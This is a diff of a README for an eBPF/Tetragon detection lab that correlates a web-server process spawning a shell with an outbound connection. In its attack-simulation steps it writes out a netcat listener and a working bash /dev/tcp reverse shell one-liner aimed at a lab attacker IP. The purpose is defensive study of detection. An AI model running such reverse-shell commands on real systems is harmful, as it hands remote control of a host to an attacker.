@@ -1,42 +1,74 @@
 ![Version](https://img.shields.io/badge/version-2.0--correlation-blue?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Success_PoC-success?style=for-the-badge)
 
-# 🛰️ Sentinel Trace
 
-> **"Signals are cheap. Decisions are earned."**
-> *Behavioral Detection Lab powered by eBPF & Tetragon.*
+# 🛰️ Sentinel Trace v2.0 — Correlation & Context: Exploring Reverse Shell (Work in Progress)
+
+**The Goal:** Moving from isolated signals to **behavioral chains**. 
+Instead of just seeing a process, we link it to network activity and MITRE ATT&CK techniques.
+
+### 🔭 New Capabilities
+- **Network Observability:** Monitoring TCP/UDP connections in real-time via Tetragon.
+- **Signal Correlation:** Linking a `process_exec` (Shell) to a `socket_connect` (Reverse Shell).
+- **Multi-Node Lab:**
+  - 🛡️ **Debian 12** (Target): Protected by Sentinel Trace.
+  - 🛡️ **Metasploitable3** (Vulnerable Target): Expanded monitoring.
+  - 💀 **Kali Linux** (Attacker): Simulation of RCE and Privilege Escalation.
+
+### 🛡️ Planned Scenario: The Reverse Shell Chain
+Sentinel Trace v2.0 will detect the following sequence as a single high-priority alert:
+1. `Nginx` (UID 33) spawns `/bin/sh` (**Process Signal**)
+2. `/bin/sh` initiates an outbound connection to a non-standard port 4444 (**Network Signal**)
+3. **Reasoning:** Unauthorized Outbound Shell (MITRE T1059.004).
+
+### 🛠️ Infrastructure Evolution
+- Integration of **Grafana Loki** or **ELK** to centralize and visualize eBPF signals.
+- First automated enforcement rules (**Sigkill** on confirmed C2 connections).
+
+
+# 🧪 Tetragon Standalone — RCE Correlation Lab (Genesis)
+
+## 🛠️ Step-by-Step Lab Setup
 
 ---
 
-## 🌐 Overview
-**Sentinel Trace** is a Blue Team-focused security lab dedicated to **behavioral detection** using low-level system signals. 
+## 1️⃣ Attacker (Kali) Side 
+![Detection Log](assets/img/v2/v2-network-traffic-detection.png)
 
-While most security tools focus on signatures, Sentinel Trace focuses on **contextual reasoning**. It observes, contextualizes, and explains suspicious behaviors at the kernel level.
+Listener receiving incoming connection from the target
 
-### 🧭 Roadmap
-- [x] **v1.0 Genesis**: Single-signal detection (Process Monitoring).
-- [x] **v2.0 Correlation**: Multi-signal (Process + Network) correlation.
-- [ ] **v2.5 MITRE Mapping**: Direct mapping to ATT&CK techniques (Work in Progress).
-- [ ] **v3.0 Sovereign Bridge**: Automated enforcement (Work in Progress).
-
----
-
-## 🧠 Detection Philosophy: "Reasoning-First"
-- ✅ **Context over Isolation:** A shell is not a threat; a shell spawned by `nginx` is.
-- ✅ **Kernel-Level Truth:** Using eBPF for tamper-proof telemetry.
-- ✅ **Evidence-Based:** Every alert is backed by a clear parent/child process lineage.
+```bash
+# Start a Netcat listener on port 4444
+nc -lvnp 4444
+```
 
 ---
 
-## 🏗️ Architecture & Persistence
-Sentinel Trace applies **Infrastructure as Code (IaC)** principles for resilience:
+## 2️⃣ Target (Debian) Side
+![Detection Log](assets/img/v2/v2-tracing-policy-activation.png)
 
-1. **Deployment Engine (`install.sh`)**: Standardizes environment and injects policies.
-2. **Persistence Layer (`tetragon.service`)**: Ensures boot-time protection and auto-restart.
+Activation of the correlation policy and launch of real-time monitoring with Identity ("organization","Tetragon","cilium ebpf security tool").
 
-```text
-┌──────────────────────────┐
-│ install.sh               │  → Deployment Engine (IaC)
-├──────────────────────────┤
-│ tetragon.service         │  → Persistence Layer (Systemd)
-└──────────────────────────┘
+```bash
+# 1. Add the network observability policy
+sudo tetra tracingpolicy add policies/v2-correlation/03-network-observability.yaml
+
+# 2. Start the correlation monitor (Filtering for www-data activity)
+sudo tetra getevents --output json | jq -ce '
+  select(.process_kprobe.process.uid == 33 or .process_exec.process.uid == 33)
+'
+```
+
+---
+
+## 3️⃣ The Attack (Exploit Simulation)
+![Detection Log](assets/img/v2/v2-kali-listener-connection-reverse-shell.png)
+
+Simulation of reverse shell activation as a web user.
+
+```bash
+# Execute the reverse shell payload
+sudo -u www-data bash -c "bash -i >& /dev/tcp/192.168.19.144/4444 0>&1"
+```
+
+---
